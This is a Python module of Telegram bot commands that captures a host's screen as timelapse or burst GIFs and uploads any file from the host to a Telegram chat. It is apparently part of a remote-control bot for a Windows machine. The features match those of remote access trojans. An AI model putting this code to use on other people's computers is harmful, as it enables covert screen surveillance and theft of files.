import asyncio
import re
import tempfile
from io import BytesIO
from pathlib import Path

import mss
from PIL import Image
from telegram import Update
from telegram.ext import CommandHandler, ContextTypes

from bot.handlers.core import is_authorized


def _grab_frame(monitor_idx: int = 1) -> Image.Image:
    with mss.mss() as sct:
        monitor = sct.monitors[monitor_idx]
        raw = sct.grab(monitor)
        img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
    img.thumbnail((640, 360))
    return img


def _frames_to_gif(frames: list[Image.Image], frame_duration_ms: int = 500) -> BytesIO:
    buf = BytesIO()
    frames[0].save(
        buf, format='GIF', save_all=True,
        append_images=frames[1:],
        loop=0, duration=frame_duration_ms, optimize=True
    )
    buf.seek(0)
    return buf


def _parse_duration(s: str) -> int | None:
    m = re.match(r'(\d+)\s*([smh])?$', s.lower().strip())
    if not m:
        return None
    n, unit = int(m.group(1)), m.group(2) or 's'
    return n * {'s': 1, 'm': 60, 'h': 3600}[unit]


async def timelapse_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update):
        return
    if not context.args:
        await update.message.reply_text(
            "<b>TIMELAPSE</b>\n<pre>"
            "usage: /timelapse &lt;duration&gt; [interval=&lt;n&gt;]\n\n"
            "/timelapse 30m\n"
            "/timelapse 2h interval=10m\n"
            "duration/interval: 30s · 5m · 2h"
            "</pre>",
            parse_mode="HTML"
        )
        return

    raw_args = ' '.join(context.args)
    interval_secs = 300

    m = re.search(r'interval[=\s]+(\S+)', raw_args.lower())
    if m:
        iv = _parse_duration(m.group(1))
        if iv:
            interval_secs = iv
        raw_args = re.sub(r'interval[=\s]+\S+', '', raw_args).strip()

    duration_secs = _parse_duration(raw_args.split()[0])
    if not duration_secs:
        await update.message.reply_text("can't parse duration.")
        return

    max_frames = 48
    total_frames = min(duration_secs // interval_secs, max_frames)
    if total_frames < 2:
        await update.message.reply_text("need at least 2 frames. increase duration or decrease interval.")
        return

    eta_min = duration_secs // 60
    msg = await update.message.reply_text(
        f"timelapse: {total_frames} frames over {eta_min}m. GIF incoming."
    )

    async def _run():
        frames: list[Image.Image] = []
        for i in range(total_frames):
            try:
                frame = await asyncio.to_thread(_grab_frame)
                frames.append(frame)
            except Exception:
                pass
            if i < total_frames - 1:
                await asyncio.sleep(interval_secs)
        if not frames:
            await msg.edit_text("no frames captured.")
            return
        gif = await asyncio.to_thread(_frames_to_gif, frames, 500)
        await update.message.reply_document(
            document=gif, filename="timelapse.gif",
            caption=f"timelapse  {len(frames)} frames  {eta_min}m"
        )

    asyncio.create_task(_run())


async def stream_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update):
        return
    secs = 30
    if context.args:
        try:
            secs = max(5, min(60, int(context.args[0])))
        except ValueError:
            pass

    interval = 2
    total_frames = secs // interval
    msg = await update.message.reply_text(f"stream: {secs}s burst ({total_frames} frames)...")

    async def _run():
        frames: list[Image.Image] = []
        for _ in range(total_frames):
            try:
                frame = await asyncio.to_thread(_grab_frame)
                frames.append(frame)
            except Exception:
                pass
            await asyncio.sleep(interval)
        if not frames:
            await msg.edit_text("no frames captured.")
            return
        gif = await asyncio.to_thread(_frames_to_gif, frames, 200)
        await msg.delete()
        await update.message.reply_document(
            document=gif, filename="stream.gif",
            caption=f"stream  {len(frames)} frames  {secs}s"
        )

    asyncio.create_task(_run())


async def stage_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update):
        return
    if not context.args:
        await update.message.reply_text(
            "usage: /stage &lt;path&gt;  uploads file to Telegram for offline access",
            parse_mode="HTML"
        )
        return
    path = Path(' '.join(context.args))
    if not path.exists():
        await update.message.reply_text(f"not found: {path}")
        return
    if path.is_dir():
        await update.message.reply_text("path is a directory. provide a file.")
        return
    size = path.stat().st_size
    from utils.windows_utils import fmt_size
    await update.message.reply_document(
        document=open(path, 'rb'),
        filename=path.name,
        caption=f"staged: {path.name}  ({fmt_size(size)})"
    )


def register_timelapse_handlers(app) -> None:
    app.add_handler(CommandHandler("timelapse", timelapse_cmd))
    app.add_handler(CommandHandler("stream",    stream_cmd))
    app.add_handler(CommandHandler("stage",     stage_cmd))
